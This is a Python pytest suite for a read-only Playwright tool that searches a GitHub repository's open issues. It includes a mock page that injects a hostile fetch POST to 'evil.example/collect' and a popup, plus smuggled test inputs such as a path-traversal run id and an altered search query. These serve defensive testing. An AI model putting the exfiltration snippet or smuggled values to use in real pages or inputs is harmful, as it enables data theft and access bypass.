import json
import threading
from urllib.parse import parse_qs, urlsplit

import pytest

from likethis import issue_brief


def test_issue_brief_rejects_unsafe_inputs_before_launch(tmp_path, monkeypatch):
    def unexpected_playwright():
        raise AssertionError("invalid input must not start a browser")

    monkeypatch.setattr(issue_brief, "_start_browser", unexpected_playwright, raising=False)
    cancel = threading.Event()
    for repository, keyword, limit, run_id in [
        ("wspotter/HoldMyBeer?x=1", "keyboard", 5, "run-1"),
        ("wspotter/HoldMyBeer", "keyboard OR is:closed", 5, "run-1"),
        ("wspotter/HoldMyBeer", "keyboard OR closed", 5, "run-1"),
        ("wspotter/HoldMyBeer", "keyboard", 11, "run-1"),
        ("wspotter/HoldMyBeer", "keyboard", 5, "../escape"),
    ]:
        with pytest.raises(ValueError):
            issue_brief.execute_issue_brief(repository, keyword, limit, tmp_path, run_id, cancel)


def test_issue_brief_url_policy_is_exact_and_query_bounded():
    expected = "is:issue state:open keyboard-only"
    allowed = "https://github.com/wspotter/HoldMyBeer/issues?q=is%3Aissue+state%3Aopen+keyboard-only"
    assert issue_brief._allowed_issue_list_url(allowed, "wspotter/HoldMyBeer", expected)
    assert not issue_brief._allowed_issue_list_url("http://github.com/wspotter/HoldMyBeer/issues", "wspotter/HoldMyBeer", expected)
    assert not issue_brief._allowed_issue_list_url("https://github.com/other/HoldMyBeer/issues", "wspotter/HoldMyBeer", expected)
    assert not issue_brief._allowed_issue_list_url("https://github.com/wspotter/HoldMyBeer/issues/4", "wspotter/HoldMyBeer", expected)
    assert not issue_brief._allowed_issue_list_url(allowed + "&state=closed", "wspotter/HoldMyBeer", expected)
    assert issue_brief.validate_inputs("wspotter/HoldMyBeer", "", 10) == (
        "wspotter/HoldMyBeer", "", 10
    )
    assert issue_brief._allowed_issue_list_url(
        "https://github.com/wspotter/HoldMyBeer/issues?page=1&q=is%3Aissue+state%3Aopen+keyboard-only",
        "wspotter/HoldMyBeer", expected, allow_page_parameter=True,
    )
    assert not issue_brief._is_expected_search_response_url(
        "https://github.com/wspotter/HoldMyBeer/issues?q=is%3Aissue+state%3Aopen",
        "wspotter/HoldMyBeer", expected,
    )
    assert issue_brief._is_expected_search_response_url(allowed, "wspotter/HoldMyBeer", expected)


def _install_offline_github(monkeypatch, *, cancel_on_search=None, hostile_request=False, blank_query=False,
                            popup_on_search=False):
    from playwright.sync_api import sync_playwright as real_sync_playwright

    requested = []
    denied = []
    search_query = "is:issue state:open" if blank_query else "is:issue state:open " + (cancel_on_search or "keyboard")

    def mock_response(route):
        request = route.request
        parts = urlsplit(request.url)
        query = parse_qs(parts.query).get("q", [""])[0]
        requested.append((request.method, request.url, request.resource_type))
        if request.method not in {"GET", "HEAD"}:
            denied.append((request.method, request.url))
            route.abort()
            return
        if request.resource_type != "document":
            # Static files are unnecessary in this deterministic fixture.
            route.fulfill(status=204, body="")
            return
        if query == "is:issue state:open" and blank_query:
            body = """<!doctype html><main><input placeholder="Search issues">
              <ul><li><a href="/wspotter/HoldMyBeer/issues/8">Open issue visible for the base query</a></li></ul></main>"""
        elif query == "is:issue state:open":
            hostile = "fetch('https://evil.example/collect',{method:'POST'}).catch(()=>{});" if hostile_request else ""
            popup = "window.open('https://evil.example/popup');" if popup_on_search else ""
            body = """<!doctype html><main>
              <input placeholder="Search issues">
              <ul id="results"><li><a href="/wspotter/HoldMyBeer/issues/99">Stale old result</a></li></ul>
              <script>
                const input=document.querySelector('input');
                HOSTILE
                input.addEventListener('keydown',e=>{
                  if(e.key==='Enter') {
                    POPUP
                    fetch('/wspotter/HoldMyBeer/issues?page=1&q='+encodeURIComponent(input.value));
                    location.href='/wspotter/HoldMyBeer/issues?q='+encodeURIComponent(input.value);
                  }
                });
              </script></main>""".replace("HOSTILE", hostile).replace("POPUP", popup)
        elif query == search_query:
            if cancel_on_search:
                body = "<!doctype html><main><input placeholder=\"Search issues\"><p>No issues matched your search</p></main>"
            else:
                body = """<!doctype html><main>
                  <input placeholder="Search issues">
                  <ul id="results">
                    <li><a href="/wspotter/HoldMyBeer/issues/4">Review the teaching interface with keyboard-only navigation</a><a href="/wspotter/HoldMyBeer/issues/4">#4</a></li>
                    <li><a href="/wspotter/HoldMyBeer/issues/6">Build bounded visual teaching questions through Hermes</a></li>
                    <li><a href="/other/repo/issues/2">Wrong repository</a></li>
                    <li><a href="/wspotter/HoldMyBeer/pull/3">Not an issue</a></li>
                  </ul></main>"""
        else:
            body = "<!doctype html><main><p>Changed GitHub layout</p></main>"
        route.fulfill(status=200, content_type="text/html", body=body)

    def wrapped_sync_playwright():
        manager = real_sync_playwright()
        real_enter = manager.__enter__

        class Proxy:
            def __enter__(self):
                playwright = real_enter()
                chromium = playwright.chromium
                real_launch = chromium.launch

                def wrapped_launch(*args, **kwargs):
                    browser = real_launch(*args, **kwargs)
                    real_context = browser.new_context

                    def new_context(*ctx_args, **ctx_kwargs):
                        context = real_context(*ctx_args, **ctx_kwargs)
                        context.route("**/*", mock_response)
                        return context

                    browser.new_context = new_context
                    return browser

                chromium.launch = wrapped_launch
                return playwright

            def __exit__(self, *args):
                return manager.__exit__(*args)

        return Proxy()

    monkeypatch.setattr("playwright.sync_api.sync_playwright", wrapped_sync_playwright)
    return requested, denied


def test_issue_brief_searches_rendered_public_results_and_retains_report(tmp_path, monkeypatch):
    requested, denied = _install_offline_github(monkeypatch)
    result = issue_brief.execute_issue_brief(
        "wspotter/HoldMyBeer", "keyboard", 1, tmp_path, "run-2026", threading.Event()
    )

    assert result["status"] == "verified", result
    assert result["read_only"] is True
    assert result["source_url"].startswith("https://github.com/wspotter/HoldMyBeer/issues?")
    assert result["issues"] == [{
        "number": 4,
        "title": "Review the teaching interface with keyboard-only navigation",
        "url": "https://github.com/wspotter/HoldMyBeer/issues/4",
    }]
    assert result["truncated"] is True
    assert result["report_file"] == "run-2026-issues.json"
    assert result["screenshot_file"] == "run-2026.png"
    report = json.loads((tmp_path / result["report_file"]).read_text())
    assert report["issues"] == result["issues"]
    assert (tmp_path / result["screenshot_file"]).is_file()
    assert all(method in {"GET", "HEAD"} for method, _, _ in requested)
    assert any("/wspotter/HoldMyBeer/issues?page=1&q=" in url for _, url, _ in requested)
    assert denied == []


def test_issue_brief_reports_explicit_empty_state_and_cooperative_cancel(tmp_path, monkeypatch):
    event = threading.Event()
    requested, denied = _install_offline_github(monkeypatch, cancel_on_search="empty")
    # The fixture responds with an explicit empty state for this new query.
    monkeypatch.setattr(issue_brief, "SEARCH_SETTLE_MS", 120, raising=False)
    result = issue_brief.execute_issue_brief(
        "wspotter/HoldMyBeer", "empty", 3, tmp_path, "empty-run", event
    )
    assert result["status"] == "verified", result
    assert result["issues"] == []
    assert result["truncated"] is False
    assert denied == []


def test_blank_keyword_uses_exact_initial_query_and_final_cancel_wins(tmp_path, monkeypatch):
    requested, _ = _install_offline_github(monkeypatch, blank_query=True)
    blank = issue_brief.execute_issue_brief(
        "wspotter/HoldMyBeer", "", 3, tmp_path, "blank-run", threading.Event()
    )
    assert blank["status"] == "verified", blank
    assert blank["issues"][0]["number"] == 8
    assert parse_qs(urlsplit(blank["source_url"]).query) == {"q": ["is:issue state:open"]}
    assert len([item for item in requested if item[2] == "document"]) == 1

    event = threading.Event()
    _install_offline_github(monkeypatch)
    settled = issue_brief._settled_results

    def cancel_after_settle(*args, **kwargs):
        result = settled(*args, **kwargs)
        event.set()
        return result

    monkeypatch.setattr(issue_brief, "_settled_results", cancel_after_settle)
    cancelled = issue_brief.execute_issue_brief(
        "wspotter/HoldMyBeer", "keyboard", 3, tmp_path, "late-cancel", event
    )
    assert cancelled["status"] == "cancelled"
    assert cancelled["issues"] == []


def test_popup_attempt_is_closed_and_stops_verified_result(tmp_path, monkeypatch):
    _install_offline_github(monkeypatch, popup_on_search=True)
    result = issue_brief.execute_issue_brief(
        "wspotter/HoldMyBeer", "keyboard", 3, tmp_path, "popup-run", threading.Event()
    )
    assert result["status"] == "needs_teaching", result
    assert "popup" in result["failure"].lower()

    cancel_event = threading.Event()
    requested, denied = _install_offline_github(monkeypatch, cancel_on_search="cancel-me")
    # Trigger cancellation while the mocked search document is being loaded.
    original = issue_brief._cancelled

    def cancel_after_search(event_arg):
        if any("cancel-me" in url for _, url, _ in requested):
            cancel_event.set()
        return original(event_arg)

    monkeypatch.setattr(issue_brief, "_cancelled", cancel_after_search)
    cancelled = issue_brief.execute_issue_brief(
        "wspotter/HoldMyBeer", "cancel-me", 3, tmp_path, "cancel-run", cancel_event
    )
    assert cancelled["status"] == "cancelled"
    assert cancelled["issues"] == []
    assert denied == []


def test_issue_brief_aborts_external_post_and_reports_layout_change(tmp_path, monkeypatch):
    _, denied = _install_offline_github(monkeypatch, hostile_request=True)
    blocked = issue_brief.execute_issue_brief(
        "wspotter/HoldMyBeer", "keyboard", 3, tmp_path, "blocked-run", threading.Event()
    )
    assert blocked["status"] == "verified"
    assert blocked["read_only"] is True
    assert denied == []  # The forbidden request never reaches the offline network fixture.

    _install_offline_github(monkeypatch)
    monkeypatch.setattr(issue_brief, "DEADLINE_SECONDS", 2)
    changed = issue_brief.execute_issue_brief(
        "wspotter/HoldMyBeer", "changed", 3, tmp_path, "changed-run", threading.Event()
    )
    assert changed["status"] == "needs_teaching"
    assert "did not settle" in changed["failure"]
